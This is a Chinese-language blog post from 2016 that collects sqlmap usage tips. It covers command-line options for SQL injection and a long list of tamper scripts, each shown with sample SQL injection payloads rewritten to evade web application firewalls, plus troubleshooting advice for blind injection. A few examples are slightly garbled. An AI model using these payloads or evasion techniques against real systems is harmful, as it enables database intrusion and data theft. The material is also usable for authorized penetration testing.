---
title: sqlmap常用技巧整理
date: 2016-02-25 09:15:45
tags:
- Python
- sqlmap
categories:
- Web安全
keywords:
---
<h2 id="intro">前言</h2>通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。
<!-- more -->
## 基本结构
　　基本SQLMAP的使用方式就如下所示，使用参数式的方式，按需求添加。
``` bash
    sqlmap.py -u "http:// *"  --data="a=b" -p a   --level 3 --random-agent --referer="a" 
    --technique T --dbms=mysql --cookie="cookie" --tables

```
## 参数解释
### 星号
　　在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分
### --data
　　使用post方式提交的时候，就需要用到data参数了
### -p
　　当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
### --level
　　不同的level等级，SQLMAP所采用的策略也不近相同，当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当--level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
### --random-agent
　　使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
### --technique
　　这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。

　　支持的探测方式如下：

　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

### --tamper
　　有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）
　　--tamper=”space2comment.py”
　　理论是用/**/代替空格，当然temper的选项还有很多

* apostrophemask.py

　　作用：用utf8代替引号


* equaltolike.py

　　作用：like 代替等号

　　Example:
``` bash
   Input: SELECT * FROM users WHERE id=1

   Output: SELECT * FROM users WHERE id LIKE 1
```


* space2dash.py

　　作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）
　　Example:
``` bash
   ('1 AND 9227=9227') '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
```

* greatest.py

　　作用：绕过过滤’>’ ,用GREATEST替换大于号。
　　Example:
``` bash
   ('1 AND A > B') '1 AND GREATEST(A,B+1)=A' 
```


* space2hash.py

　　作用：空格替换为#号 随机字符串 以及换行符

　　Example:

``` bash
   Input: 1 AND 9227=9227
    Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
```
* apostrophenullencode.py

　　作用：绕过过滤双引号，替换字符和双引号。
　　Example: 
``` bash
   tamper("1 AND '1'='1") '1 AND %00%271%00%27=%00%271'

```


* halfversionedmorekeywords.py

　　作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论


　　Example:
``` bash
   ("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() 
   AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa") 
   　"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"

```

* space2morehash.py

　　作用：空格替换为 #号 以及更多随机字符串 换行符


　　Example: 
``` bash
   Input: 1 AND 9227=9227 

   Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227

```



* appendnullbyte.py

　作用：在有效负荷结束位置加载零字节字符编码
　Example: 
``` bash
('1 AND 1=1') '1 AND 1=1%00' 

```
　　常用于access
* ifnull2ifisnull.py

　作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’
Example:
``` bash
('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)' 
```
* space2mssqlblank.py(mssql)

　　作用：空格替换为其它空符号

　　Example: 
``` bash
 Input: SELECT id FROM users * 
 Output: SELECT%08id%02FROM%0Fusers
```



* base64encode.py

　　作用：用base64编码替换 Example: ("1' AND SLEEP(5)#") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all


* space2mssqlhash.py

　　作用：替换空格


　　Example: 
``` bash
('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227' 
```
* modsecurityversioned.py

　　作用：过滤空格，包含完整的查询版本注释


　　Example:

``` bash
('1 AND 2>1--') '1 /*!30874AND 2>1*/--' 
```

* space2mysqlblank.py

　　作用：空格替换其它空白符号(mysql)

　　Example: 
``` bash
　Input: SELECT id FROM users 

　Output: SELECT%0Bid%0BFROM%A0users 
```
* between.py

　　作用：用between替换大于号（>）

　　Example:
``` bash
 ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--' 
```

* space2mysqldash.py

　　作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

注：之前有个mssql的 这个是mysql的

　　Example: 
``` bash
('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'
```


* multiplespaces.py

　　作用：围绕SQL关键字添加多个空格

　　Example:
``` bash
 ('1 UNION SELECT foobar') '1 UNION SELECT foobar' 
```



* ：space2plus.py

　　作用：用+替换空格

　　Example:
``` bash
 ('SELECT id FROM users') 'SELECT+id+FROM+users' 
 ```

* bluecoat.py

　　作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like

　　Example: 
``` bash
('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' 
```
* nonrecursivereplacement.py

　　双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters

　　Example: 
``` bash
('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--' 
```
* space2randomblank.py

　　作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集

　　Example: 
``` bash
('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'
```
* sp_password.py

　　作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾

　　Example: 
``` bash
('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp\_password' 
```
* chardoubleencode.py

　　作用: 双url编码(不处理以编码的)

　　Example: 
``` bash
 Input: SELECT FIELD FROM%20TABLE 

 Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
```
* unionalltounion.py

　　作用：替换UNION ALL SELECT UNION SELECT

　　Example:
``` bash
 ('-1 UNION ALL SELECT') '-1 UNION SELECT'
```

* charencode.py

　　作用：url编码
　　Example:
``` bash
   Input: SELECT FIELD FROM%20TABLE

   Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
```

* randomcase.py

　　作用：随机大小写 Example:
``` bash
Input: INSERT
Output: InsERt
```


* unmagicquotes.py

　　作用：宽字符绕过 GPC addslashes

　　Example: 
``` bash
 Input: 1′ AND 1=1 

 Output: 1%bf%27 AND 1=1–%20
```
* randomcomments.py

　　作用：用/**/分割sql关键字

　　Example:
``` bash
‘INSERT’ becomes ‘IN//S//ERT’
```
* charunicodeencode.py

　　作用：字符串 unicode 编码

　　Example: 
``` bash
 Input: SELECT FIELD%20FROM TABLE 

 Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
```




* securesphere.py

　　作用：追加特制的字符串


　　Example:
``` bash
 ('1 AND 1=1') "1 AND 1=1 and '0having'='0having'" 
```

* versionedmorekeywords.py

　　作用：注释绕过

　　Example: 
``` bash
Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 

 Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# 
```
* space2comment.py
　　作用：Replaces space character (‘ ‘) with comments ‘/**/’

　　Example: 
``` bash
 Input: SELECT id FROM users 

 Output: SELECT//id//FROM/**/users
```

* halfversionedmorekeywords.py

　　作用：关键字前加注释

　　Example: 
``` bash
 Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa 

 Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa
```

### 有时发现跑出的数据都是毫无意义的字符

解决方案：

　　a）SQLMAP会提示你加--hex或者--no-cast，有时会有帮助
　　b）如果你用的是time-based注射，建议增加延时--time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境
　　c）增加level的数值
### 暴力猜表
　　针对access站可以构造common-tables.txt
### 显示unable to connect to the target url

　　第一个可能是time-out设置的太小，出现问题，再有可能就是WAF直接把请求拦截掉了，因此得不到响应。

有些waf比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应

　　解决方案：减少time-out进行检测，在跑数据时改回time-out
### 提示possible integer casting detected

　　如果是在手工测试，建议到这里可以停止了，节省时间。

　　如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。
### 参考文献：
　　http://drops.wooyun.org/tools/4760
　　http://drops.wooyun.org/tips/143
　　http://www.2cto.com/Article/201306/223082.html
　　http://drops.wooyun.org/tips/5254